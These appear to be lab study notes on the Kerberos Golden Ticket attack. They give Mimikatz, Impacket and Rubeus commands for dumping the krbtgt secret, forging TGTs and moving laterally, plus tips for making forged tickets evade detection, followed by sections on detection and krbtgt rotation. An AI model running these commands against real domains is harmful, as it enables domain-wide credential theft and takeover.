
A **Golden Ticket** attack involves forging a Kerberos **Ticket Granting Ticket (TGT)** using the secret of the Active Directory `krbtgt` account.

Because a TGT can be used to request service tickets for resources across the domain, compromising the `krbtgt` secret can provide broad domain-level access.

```text
KRBTGT Hash / AES Key
        ↓
     Forge TGT
        ↓
   Impersonate User
        ↓
 Request Service Tickets
        ↓
Access Domain Resources
```

The `krbtgt` account is a special AD account used by the KDC to sign/encrypt Kerberos TGTs.

> **Important:** The `krbtgt` password does not automatically rotate like normal user passwords. It must be deliberately reset by administrators.

---

# Obtaining the KRBTGT Secret

The `krbtgt` secret can potentially be obtained from a Domain Controller through methods such as:
- `DCSync`
- `NTDS.dit` extraction
- LSASS credential extraction

For example, with Mimikatz:
```text
lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
```

Or with Impacket:
```bash
secretsdump.py <DOMAIN>/<USER>@<DC>
```

These operations normally require highly privileged access, such as permissions equivalent to replicating directory changes.

---

# Create a Golden Ticket

Mimikatz's ticket-forging command is:
```text
kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /id:<RID>
```

Example:
```text
kerberos::golden \
/user:Administrator \
/domain:controller.local \
/sid:S-1-5-21-... \
/krbtgt:<KRBTGT_HASH> \
/id:500
```

Important parameters:

| Option    | Meaning                            |
| --------- | ---------------------------------- |
| `/user`   | User represented by the forged TGT |
| `/domain` | AD domain                          |
| `/sid`    | Domain SID                         |
| `/krbtgt` | `krbtgt` NT hash                   |
| `/id`     | User RID                           |
| `/groups` | Group RIDs included in the PAC     |
| `/ptt`    | Inject ticket directly into memory |
| `/ticket` | Save ticket as a `.kirbi` file     |

---

# Golden Ticket with AES

Modern environments should use the `krbtgt` **AES128/AES256 key** when available.

Mimikatz:
```text
kerberos::golden \
/user:Administrator \
/domain:controller.local \
/sid:S-1-5-21-... \
/aes256:<KRBTGT_AES256_KEY> \
/ticket:golden.kirbi
```


---

# Create a Golden Ticket Remotely

Using Impacket `ticketer.py`:
```bash
ticketer.py \
-nthash <KRBTGT_NT_HASH> \
-domain-sid <DOMAIN_SID> \
-domain <DOMAIN> \
Administrator
```

Example:
```bash
ticketer.py \
-nthash <KRBTGT_HASH> \
-domain-sid S-1-5-21-... \
-domain thm.loc \
Administrator
```

Tool path:
```text
/home/eyad/.local/share/pipx/venvs/impacket/bin
```

Output:
```text
Administrator.ccache
```

### Important options

| Option        | Meaning                   |
| ------------- | ------------------------- |
| `-nthash`     | `krbtgt` NT hash          |
| `-aesKey`     | `krbtgt` AES key          |
| `-domain-sid` | Domain SID                |
| `-domain`     | AD domain                 |
| `-user-id`    | User RID                  |
| `-groups`     | Group RIDs                |
| `-duration`   | Ticket lifetime in hours  |
| `-extra-pac`  | Add newer PAC information |

---

# Use the Forged Ticket

```bash
export KRB5CCNAME=Administrator.ccache
```

This tells Kerberos-aware tools to use the forged TGT.

### Authenticate
```bash
psexec.py <DOMAIN>/Administrator@<TARGET_FQDN> \
-k -no-pass
```

Or:
```bash
wmiexec.py <DOMAIN>/Administrator@<TARGET_FQDN> \
-k -no-pass
```

- `-k` → Kerberos authentication.
- `-no-pass` → Don't use a password.
- The ticket in `KRB5CCNAME` is used for authentication.

---

# Rubeus

Rubeus can forge and inject a Golden Ticket.

Basic structure:
```powershell
Rubeus.exe golden `
/rc4:<KRBTGT_HASH> `
/domain:<DOMAIN> `
/sid:<DOMAIN_SID> `
/user:<USER> `
/ptt
```

### Using AES256

```powershell
Rubeus.exe golden `
/aes256:<KRBTGT_AES256> `
/domain:<DOMAIN> `
/sid:<DOMAIN_SID> `
/user:<USER> `
/ptt
```

`/ptt` injects the forged ticket directly into the current logon session.

Check tickets:
```powershell
klist
```

---

# Rubeus `/ldap`

Rubeus can retrieve domain information through LDAP:

```powershell
Rubeus.exe golden `
/aes256:<KRBTGT_AES256> `
/user:<USER> `
/ldap `
/printcmd `
/nowrap
```

- `/ldap` → Retrieves relevant domain/user information from LDAP.    
- `/printcmd` → Prints a command containing the retrieved values.
- `/nowrap` → Prevents wrapping of the ticket output.

This can help construct a ticket using actual domain information instead of manually guessing PAC values.

---

# Golden Ticket PAC

The **Privilege Attribute Certificate (PAC)** contains authorization information associated with the Kerberos identity.

Important values include:
```text
User SID
Group Membership
User Information
Additional SIDs
UPN/DNS Information
```

A forged ticket with unrealistic PAC information can become easier for defenders to identify.

For example:
```text
Administrator
      ↓
Groups: 512, 513, 518, 519
      ↓
Domain Admin / Enterprise Admin
```

When performing authorized testing, realistic domain and user information can be obtained through LDAP rather than inventing values.

---

# Ticket Lifetime

A major Golden Ticket detection indicator is an unrealistic ticket lifetime.

Some ticket-forging tools historically generated tickets with extremely long lifetimes.

Example:

```text
Start:
03/11/2021

End:
03/09/2031
```

A 10-year TGT is highly abnormal.

With Mimikatz, lifetime-related parameters include:
```text
/startoffset:<MINUTES>
/endin:<MINUTES>
/renewmax:<MINUTES>
```

With Impacket:
```bash
-duration <HOURS>
```

For example:
```bash
ticketer.py \
-aesKey <KRBTGT_AES256> \
-domain-sid <DOMAIN_SID> \
-domain <DOMAIN> \
-duration 10 \
Administrator
```

The important point is to make the ticket lifetime consistent with the domain's Kerberos policy during authorized testing.

---

# Golden Ticket vs Silver Ticket

|Golden Ticket|Silver Ticket|
|---|---|
|Forges a **TGT**|Forges a **TGS**|
|Uses `krbtgt` secret|Uses service-account secret|
|Can request tickets for services|Targets a specific service|
|Broad domain-level potential|Service-specific|
|Compromise of `krbtgt` required|Target service secret required|

```text
Golden Ticket

KRBTGT Secret
     ↓
Forge TGT
     ↓
Request TGS
     ↓
Multiple Services
```

```text
Silver Ticket

Service Secret
     ↓
Forge TGS
     ↓
Specific Service
```

---

# Golden Ticket Detection

Useful Windows Security events include:

|Event ID|Meaning|
|---|---|
|`4624`|Successful logon|
|`4672`|Special privileges assigned|
|`4768`|TGT requested|
|`4769`|TGS requested|

One useful detection technique is correlating `4769` events with `4768`.

Normally:
```text
4768
TGT requested
   ↓
4769
TGS requested
   ↓
Service Access
```

A forged Golden Ticket can result in:
```text
Forged TGT
    ↓
4769
TGS requested
```

without a corresponding `4768` for the forged TGT.

> **Important:** This is an indicator, not absolute proof of a Golden Ticket. Kerberos authentication can occur in ways that make simple event correlation incomplete.

---

# Other Detection Indicators

### Unusual Ticket Lifetime
```text
Normal:
Hours → Days

Suspicious:
Years
```

### Unexpected Encryption

For example:
```text
Domain normally uses AES
        ↓
Unexpected RC4 ticket
        ↓
Potential indicator
```

### Abnormal PAC
Examples:
- Impossible group memberships.
- Unexpected SIDs.
- User information inconsistent with AD.
- Missing or unusual PAC structures.

### Sensitive Accounts

Defenders can pay particular attention to Kerberos activity involving highly privileged accounts such as the built-in Domain Administrator.

---

# KRBTGT Password Rotation

The `krbtgt` account maintains password history, meaning changing its password **once** does not necessarily invalidate every previously forged ticket immediately.

A common defensive procedure is:
```text
Reset KRBTGT
      ↓
Wait for old tickets to expire
      ↓
Reset KRBTGT again
      ↓
Old KRBTGT keys become invalid
```

Two resets are commonly recommended because AD retains previous password history for `krbtgt`.

The exact waiting period should be based on the organization's Kerberos ticket lifetime and replication considerations.

---

# Golden Ticket Attack Chain

```text
Compromise Domain Controller / Privileged Account
                    ↓
             Obtain KRBTGT Secret
                    ↓
                Forge TGT
                    ↓
             Impersonate User
                    ↓
         Request Service Tickets
                    ↓
         SMB / WMI / Other Services
                    ↓
             Domain-Level Access
```

---

# Key Takeaways

- **Golden Ticket = forged Kerberos TGT.**
    
- Requires the **`krbtgt` account secret**.
    
- `krbtgt` secrets can be obtained through techniques such as **DCSync** or credential/database extraction after gaining sufficient privileges.
    
- The forged TGT can represent an arbitrary user.
    
- Golden Tickets have **broad domain-level potential** because a TGT can be used to obtain service tickets.
    
- **AES128/AES256 keys are preferred** in modern environments where available.
    
- Avoid unrealistic ticket lifetimes during authorized testing.
    
- PAC contents should be consistent with actual AD data.
    
- `4768`/`4769` correlation can help identify suspicious Kerberos activity.
    
- Resetting the `krbtgt` password **twice**, with appropriate waiting periods, is a standard defensive approach for invalidating forged tickets.
    
- **Golden Ticket:** forge a TGT.
    
- **Silver Ticket:** forge a TGS for a specific service.